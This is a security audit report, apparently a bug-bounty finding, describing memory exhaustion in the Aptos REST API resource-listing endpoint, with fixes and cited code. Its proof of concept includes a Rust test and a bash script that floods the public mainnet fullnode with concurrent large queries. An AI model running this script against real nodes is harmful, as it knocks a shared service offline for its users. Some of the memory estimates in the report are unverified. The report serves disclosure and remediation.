# Audit Report

## Title
REST API Memory Exhaustion via Unbounded Resource Query Response Size

## Summary
The `/accounts/:address/resources` API endpoint allows querying up to 9,999 resources per request without enforcing a total response size limit. An attacker can create an account with thousands of maximum-sized resources (1MB each) and query them all at once, causing the API server to load up to ~10GB of data into memory before responding. This can exhaust server memory and cause API unavailability.

## Finding Description

The Aptos REST API's resource query endpoint lacks total response size validation, breaking the **Resource Limits** invariant (#9: "All operations must respect gas, storage, and computational limits").

**Attack Path:**

1. **Resource Creation Phase**: An attacker creates an account and populates it with large resources over multiple transactions. Each resource can be up to 1MB in size [1](#0-0) , enforced by the `max_bytes_per_write_op` storage limit.

2. **Query Phase**: The attacker sends a GET request to `/accounts/{address}/resources?limit=9999`. The endpoint accepts a `limit` parameter capped at `max_account_resources_page_size` which defaults to 9,999 [2](#0-1) .

3. **Memory Allocation**: The `get_resources_by_pagination()` function collects all requested resources into a `Vec` in memory [3](#0-2) . Unlike the similar `get_state_values()` function which enforces a `MAX_REQUEST_LIMIT` check [4](#0-3) , `get_resources_by_pagination()` has no such protection.

4. **Resource Group Expansion**: After collecting resources, the code expands resource groups into individual resources [5](#0-4) , which can multiply the response size beyond the original limit. The TODO comment acknowledges this issue is not properly handled [6](#0-5) .

5. **JSON Conversion**: All resources are converted to JSON representation [7](#0-6) , which typically expands the data size 2-3x compared to the BCS-encoded storage format.

**Memory Calculation:**
- Raw BCS data: 9,999 resources Ã— 1MB = ~9.75GB
- After JSON expansion: ~20-30GB
- With resource group expansion: potentially higher

## Impact Explanation

This qualifies as **High Severity** under the Aptos bug bounty criteria: "API crashes" and "Validator node slowdowns." 

The vulnerability enables:
- **Denial of Service**: Multiple concurrent requests can exhaust all available API server memory
- **Service Degradation**: Even without crashes, large allocations cause memory pressure and slow response times for all users
- **Cascading Failures**: If API servers share infrastructure with other services, memory exhaustion can affect the entire node

While the attack requires upfront gas costs to create large resources, this is a one-time investment that enables unlimited exploitation. The cost-benefit ratio heavily favors the attacker.

## Likelihood Explanation

**Likelihood: High**

The attack is straightforward to execute:
- No special privileges required beyond standard account creation
- Attack setup can be scripted easily
- The endpoint is publicly accessible on all Aptos nodes running the REST API
- Multiple attackers could coordinate or a single attacker could create multiple accounts
- No rate limiting is enforced at the response size level

The main constraint is the gas cost to create large resources, but this is economically feasible for a determined attacker, especially considering the impact on network availability.

## Recommendation

Implement total response size validation in `get_resources_by_pagination()` consistent with `get_state_values()`:

**Option 1 - Enforce MAX_REQUEST_LIMIT (Immediate Fix):**

Add a check in `api/src/context.rs` in the `get_resources_by_pagination()` function after line 529: [3](#0-2) 

Add validation to ensure the total number of resources (after expansion) doesn't exceed `MAX_REQUEST_LIMIT`:

```rust
// After line 551, before returning:
if kvs.len() > MAX_REQUEST_LIMIT as usize {
    bail!("Too many resources for account ({:?}). Returned {} resources, limit is {}", 
          address, kvs.len(), MAX_REQUEST_LIMIT);
}
```

**Option 2 - Reduce Default Page Size (Defense in Depth):**

Lower `DEFAULT_MAX_ACCOUNT_RESOURCES_PAGE_SIZE` in `config/src/config/api_config.rs`: [2](#0-1) 

Change from 9999 to a more conservative value like 1000, matching the pattern used for transactions and events which default to 100 [8](#0-7) .

**Option 3 - Track Total Byte Size (Comprehensive Solution):**

Implement actual byte-size tracking during collection:
```rust
let mut total_bytes = 0u64;
const MAX_RESPONSE_BYTES: u64 = 100 << 20; // 100MB

for (tag, value) in kvs.iter() {
    total_bytes += value.len() as u64;
    if total_bytes > MAX_RESPONSE_BYTES {
        bail!("Response size limit exceeded for account ({:?})", address);
    }
}
```

## Proof of Concept

**Rust Integration Test:**

```rust
#[tokio::test]
async fn test_resource_exhaustion_attack() {
    use aptos_rest_client::Client;
    use aptos_types::account_address::AccountAddress;
    use move_core_types::language_storage::StructTag;
    use std::str::FromStr;
    
    // Setup test node with REST API
    let (swarm, client) = setup_test_environment().await;
    let attacker = swarm.aptos_public_info().random_account();
    
    // Phase 1: Create account with maximum resources
    // Each resource approaching 1MB limit
    for i in 0..1000 {  // Limited for test, real attack uses 9999
        let large_data = vec![0u8; 1_000_000]; // 1MB payload
        
        // Create a resource with large data field
        let txn = create_large_resource_transaction(
            &attacker,
            format!("LargeResource{}", i),
            large_data
        );
        
        client.submit_and_wait(&txn).await.unwrap();
    }
    
    // Phase 2: Query all resources at once
    let start_mem = get_process_memory_usage();
    
    let response = client.get_account_resources(
        attacker.address(),
        Some(1000) // Request maximum limit
    ).await;
    
    let end_mem = get_process_memory_usage();
    let mem_increase = end_mem - start_mem;
    
    // Verify memory increase is substantial (>1GB for 1000 resources)
    assert!(mem_increase > 1_000_000_000, 
            "Memory increase: {} bytes (expected >1GB)", mem_increase);
    
    // Demonstrate that concurrent requests amplify the issue
    let mut handles = vec![];
    for _ in 0..10 {
        let client_clone = client.clone();
        let addr = attacker.address();
        handles.push(tokio::spawn(async move {
            client_clone.get_account_resources(addr, Some(1000)).await
        }));
    }
    
    // This would cause OOM on servers with limited memory
    futures::future::join_all(handles).await;
}
```

**Attack Script (Conceptual):**

```bash
# Step 1: Create account and fund it
aptos account create --account attacker

# Step 2: Deploy contract that creates large resources
aptos move publish --package large_resource_creator/

# Step 3: Populate account with large resources (repeat many times)
for i in {1..9999}; do
    aptos move run --function-id attacker::large_resource::create \
        --args "u64:$i" "vector<u8>:$(python3 -c 'print("0x" + "00"*1000000)')"
done

# Step 4: Launch attack - query all resources
# This single request loads ~10GB into API server memory
curl "https://fullnode.mainnet.aptoslabs.com/v1/accounts/0xATTACKER_ADDRESS/resources?limit=9999"

# Step 5: Amplify with concurrent requests to cause OOM
for i in {1..20}; do
    curl "https://fullnode.mainnet.aptoslabs.com/v1/accounts/0xATTACKER_ADDRESS/resources?limit=9999" &
done
```

## Notes

The vulnerability is exacerbated by resource groups, which can contain multiple resources within a single storage item. The current implementation counts resource groups as single items when applying the limit, but expands them afterward, potentially multiplying the actual number of returned resources. This amplification effect is explicitly noted as a TODO in the codebase [6](#0-5) .

The inconsistency between `get_state_values()` (which has protection) and `get_resources_by_pagination()` (which lacks it) suggests this is an oversight rather than a deliberate design choice.

### Citations

**File:** aptos-move/aptos-gas-schedule/src/gas_schedule/transaction.rs (L154-157)
```rust
            max_bytes_per_write_op: NumBytes,
            { 5.. => "max_bytes_per_write_op" },
            1 << 20, // a single state item is 1MB max
        ],
```

**File:** config/src/config/api_config.rs (L99-99)
```rust
pub const DEFAULT_MAX_PAGE_SIZE: u16 = 100;
```

**File:** config/src/config/api_config.rs (L100-100)
```rust
const DEFAULT_MAX_ACCOUNT_RESOURCES_PAGE_SIZE: u16 = 9999;
```

**File:** api/src/context.rs (L460-466)
```rust
        let kvs = iter
            .by_ref()
            .take(MAX_REQUEST_LIMIT as usize)
            .collect::<Result<_>>()?;
        if iter.next().transpose()?.is_some() {
            bail!("Too many state items under account ({:?}).", address);
        }
```

**File:** api/src/context.rs (L497-501)
```rust
        // TODO: Consider rewriting this to consider resource groups:
        // * If a resource group is found, expand
        // * Return Option<Result<(PathType, StructTag, Vec<u8>)>>
        // * Count resources and only include a resource group if it can completely fit
        // * Get next_key as the first struct_tag not included
```

**File:** api/src/context.rs (L526-529)
```rust
        let kvs = resource_iter
            .by_ref()
            .take(limit as usize)
            .collect::<Result<Vec<(StructTag, Vec<u8>)>>>()?;
```

**File:** api/src/context.rs (L536-551)
```rust
        let kvs = kvs
            .into_iter()
            .map(|(tag, value)| {
                if converter.is_resource_group(&tag) {
                    // An error here means a storage invariant has been violated
                    bcs::from_bytes::<ResourceGroup>(&value)
                        .map(|map| map.into_iter().collect::<Vec<_>>())
                        .map_err(|e| e.into())
                } else {
                    Ok(vec![(tag, value)])
                }
            })
            .collect::<Result<Vec<Vec<(StructTag, Vec<u8>)>>>>()?
            .into_iter()
            .flatten()
            .collect();
```

**File:** api/src/accounts.rs (L474-490)
```rust
            AcceptType::Json => {
                // Resolve the BCS encoded versions into `MoveResource`s
                let state_view = self
                    .context
                    .latest_state_view_poem(&self.latest_ledger_info)?;
                let converter = state_view
                    .as_converter(self.context.db.clone(), self.context.indexer_reader.clone());
                let converted_resources = converter
                    .try_into_resources(resources.iter().map(|(k, v)| (k.clone(), v.as_slice())))
                    .context("Failed to build move resource response from data in DB")
                    .map_err(|err| {
                        BasicErrorWith404::internal_with_code(
                            err,
                            AptosErrorCode::InternalError,
                            &self.latest_ledger_info,
                        )
                    })?;
```
